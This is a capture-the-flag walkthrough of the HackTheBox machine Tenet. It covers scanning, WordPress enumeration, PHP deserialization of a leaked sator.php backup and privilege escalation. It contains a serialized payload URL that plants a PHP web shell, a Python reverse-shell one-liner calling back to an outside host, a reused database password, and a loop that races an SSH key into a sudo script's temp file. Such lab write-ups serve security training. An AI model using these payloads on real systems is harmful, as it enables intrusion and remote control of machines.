# HackTheBox-Tenet

## Rustscan

```bash
rustscan -a 10.10.10.223 -- -A -sC -sV                                                             
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.                  
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |                      
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |             
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'                                                                                            
The Modern Day Port Scanner.                              
________________________________________                                                                                                            
: https://discord.gg/GFrQsGy           :                                                                                                            
: https://github.com/RustScan/RustScan :                                                                                                            
 --------------------------------------
Nmap? More like slowmap.🐢                                                                                                                          
[~] The config file is expected to be at "/root/.rustscan.toml"                                                                                     
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.223:22                 
Open 10.10.10.223:80                 

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                    
| ssh-hostkey:       
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)      
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA4SymrtoAxhSnm6gIUPFcp1VhjoVue64X4LIvoYolM5BQPblUj2aezdd9aRI227jVzfkOD4Kg3OW2yT5uxFljn7q/Mh5/muGvUNA+nNO6pC
C0tZPoPEwMT+QvR3XyQXxbP6povh4GISBySLw/DFQoG3A2t80Giyq5Q7P+1LH1f/m63DyiNXOPS8fNBPz59BDEgC9jJ5Lu2DTu8ko1xE/85MLYyBKRSFHEkqagRXIYUwVQASHgo3OoJ+VAcBTJZH
1TmXDc4c6W0hIPpQW5dyvj3tdjKjlIkw6dH2at9NL3gnTP5xnsoiOu0dyofm2L5fvBpzvOzUnQ2rps2wANTZwZ
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)   
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLMM1BQpjspHo9teJwTFZntx+nxj8D51/Nu0nI3atUpyPg/bXlNYi26boH8zYTrC6fWepgaG2G
ZigAqxN4yuwgo=                                                            
|   256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMQeNqzXOE6aVR3ulHIyB8EGf1ZaUSCNuou5+cgmNXvt
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:                      
|_  Supported Methods: POST OPTIONS HEAD GET                              
|_http-server-header: Apache/2.4.29 (Ubuntu)                              
|_http-title: Apache2 Ubuntu Default Page: It works                       
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port     
```

## PORT 80 (HTTP)

Visting the web page it shows default apache web page

<img src="https://imgur.com/1BwN4Vw.png"/>

Running `dirsearch`

<img src="https://imgur.com/A8dchV2.png"/>

Now this doesn't loads css so looking at the source it shows the there's a domain 

`tenet.htb`

<img src="https://imgur.com/9bNBTYF.png"/>

Adding this to `/etc/hosts` file

<img src="https://imgur.com/CNaC6lG.png"/>

We can see some posts on the main page

<img src="https://imgur.com/ulTFVaT.png"/>

```python
We’re looking for beta testers of our new time-management software, ‘Rotas’

‘Rotas’ will hopefully be coming to market late 2021, pending rigorous QA from our developers, and you!

For more information regarding opting-in, watch this space.

Published December 16, 2020 By [protagonist]
```

```python
We’re moving our data over from a flat file structure to something a bit more substantial. Please bear with us whilst we get one of our devs on the migration, which shouldn’t take too long.

Thank you for your patience

Published December 16, 2020 By [protagonist]
```

This post had a comment 

```python
[neil]

[December 16, 2020 at 2:53 pm]

did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!
```

So we have some information that there are two users neil and protagonist also there's a php file and backup folder

We could have alternatively done this through `wpscan`

<img src="https://imgur.com/TzKJB9m.png"/>

<img src="https://imgur.com/ybgIadt.png"/>

I tried bruteforcing through wpscan but it didn't found any password

<img src="https://imgur.com/0l3BEjI.png"/>


Going back to that apache default page  I tried to include `sator.php` and got something

<img src="https://imgur.com/fQuryJK.png"/>

If we focus on the comment which was made on the post "the sator php file and the backup"

<img src="https://imgur.com/cAQhHjp.png"/>

We will get a backup file for `staor.php`

```php
<?php

class DatabaseExport
{
	public $user_file = 'users.txt';
	public $data = '';

	public function update_db()
	{
		echo '[+] Grabbing users from text file <br>';
		$this-> data = 'Success';
	}


	public function __destruct()
	{
		file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
		echo '[] Database updated <br>';
	//	echo 'Gotta get this working properly...';
	}
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>

```


## PHP Deserlization attack

We can see here that there's a class `DatabaseExport` in which there are two public variables `user_file` and `data` and in this class there's a public function called `update_db()` which will set the `data` variable to "sucess" which is just a text as you can see from the sator.php show on the web browser at the end there's a magic function `__destruct()` which will be automatcially called when an object is destroyed , there the `user_file` will be made with the contents from `data` and will put in the web directory which means users.txt will be created in the web directory having the data "success".

At the end we can the `GET` parameter `arepo` , now here exists a vulnerability which is known as** PHP Deserilization** 

So to exploit this we have to modify the class variables in this case `user_file` and `data` and seriliaze it , once we get the serliazed string we pass it to `arepo` paramter.

<img src="https://imgur.com/xzxCRzb.png"/>

After running it we will get a php serialized object

<img src="https://imgur.com/Ocvi0RZ.png"/>

But we need to pass this to GET paramter in a url encoded form so I used cyberchef to do that

<img src="https://imgur.com/I7LmXV9.png"/>

And then paste into the GET parameter

```bash
http://10.10.10.223/sator.php?arepo=O:14:%22DatabaseExport%22:2:%7Bs:9:%22user_file%22;s:9:%22shell.php%22;s:4:%22data%22;s:29:%22%3C?php%20system($_GET%5B%22cmd%22%5D);?%3E%22;%7D
```

<img src="https://imgur.com/ki71f7v.png"/>

We can see the message "Database updated" so let's see if `shell.php` was made on the web directory or not.

<img src="https://imgur.com/sPf3gtb.png"/>

<img src="https://imgur.com/4Dhsv2O.png"/>

And we have a rce, cool !

<img src="https://imgur.com/RoxtkbY.png"/>

Python3 is installed so we can get a reverse shell through it

```bash
http://10.10.10.223/shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.198",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

<img src="https://imgur.com/FcVsPg7.png"/>

Stabilize the shell

<img src="https://imgur.com/BYOLfZh.png"/>

Let's check the cron jobs

<img src="https://imgur.com/lIXXkhj.png"/>

Open ports

<img src="https://imgur.com/zvjHcgZ.png"/>

## Escalating to user

We see mysql running on localhost so we can try to find creds for mysql and since wordpress is hosted the creds are in `wp-config.php` file

<img src="https://i.imgur.com/15rWkzs.png"/>

<img src="https://i.imgur.com/eARb5sw.png"/>

```bash
/** MySQL database username */                                                                                                                      
define( 'DB_USER', 'neil' );                     
/** MySQL database password */                                                                                                                      
define( 'DB_PASSWORD', 'Opera2112' );

/** MySQL hostname */                                                                                                                               
define( 'DB_HOST', 'localhost' );                                                                                                                   
                                                            
```

The db user is `neil` so this is interesting as neil is also the user on the linux machine so let's try this password

<img src="https://imgur.com/OmukzXa.png"/>

## Privilege Escalation

Doing `sudo -l` we can see what we run as sudo

<img src="https://imgur.com/SMnKeWi.png"/>

Reading the contents of the bash script

<img src="https://imgur.com/d9GYJuC.png"/>

Here these functions are not that interesting , if we go to the bottom

<img src="https://imgur.com/PHw2PuG.png"/>

We can see a function `addkey()` in which a temporary file is being made with command `mktemp`

<img src="https://imgur.com/FeDoFlb.png"/>

If we run this command on our local machine to see what file name it generates we can see that the file name it's pretty unique everytime this command runs 

<img src="https://imgur.com/i58Yvuk.png"/>

On the target machine it also generates a random name

<img src="https://imgur.com/P0CcQis.png"/>


In the script that file is being removed but that's the file need to put in our ssh public key so we need to run a loop in which we try to put our public key in every file that starts with `ssh` so we have to utilize wildcard here ( * )


So our one liner script should look like this

```bash
while true; do var=$(ls /tmp |grep ssh);echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzKK/Hru6t4lA0tu4CX8E3BzkM8Bl7cFxyheVBHZS+flyqq
/sZuRfPHCQE2LNL5IgRfHDljFO4MuiYJgrMr8jCA+stDBxGAhCiRZ4UmZ7OYn1abGGOmtUyaCYvJp3pizvcyVIJsNBQBSk1JETfopgKCydtXfbXYF8kukjM29AVbIoD99UAmo8Qm1RDv+cguO+0q
Tg1vHMErURIyM/P3fhNakGL2F1/rENpvqB7EK06N6KYLujCf9Y87slTCU33gHoo5iG5mX5JFi2pBhWJnOQECjaeEsTjvKKvgIX7wy14b3I4b7fLstsXg69CCE9KF5Zr1uWYP0JGG1pB0OrDH4LPj
MRxDALCKMnA4F8OrSmTzfgWJ9LhxxFHh73ExsfGJYypBuSOxh+4UBSuF5znPbJo315Qd05LEcpCAv623vqjsUDQUEMeJVz0NiWkGCuJIxt+YTGinB9hDj58seHsI4yMZe5HtY5cQJLR09/fVoGPi
ebD/lFk68jQFonJs73NlPE= root@kali' | tee $var ;done
```

We are running a while loop infinite number of times and in there we have a variable which is grabbing the name of the random generated ssh file , next we are printing our public ssh key and piping it to that file and logging it with the help of `tee`

So first I will run the `enableSSH` script 

<img src="https://imgur.com/eBO3wUh.png"/>

Then will run my one liner bash script

<img src="https://imgur.com/D1QqNcr.png"/>

<img src="https://imgur.com/7GYp5XO.png"/>

After running it for some time and terminated both the scripts and in the `/tmp` folder you will see those  randomly generated ssh file , some of them will have no content as the temp file gets deleted.

<img src='https://imgur.com/xmwmftp.png'/>

Try to ssh in the target machine using ssh private key

<img src="https://imgur.com/LEojPH6.png"/>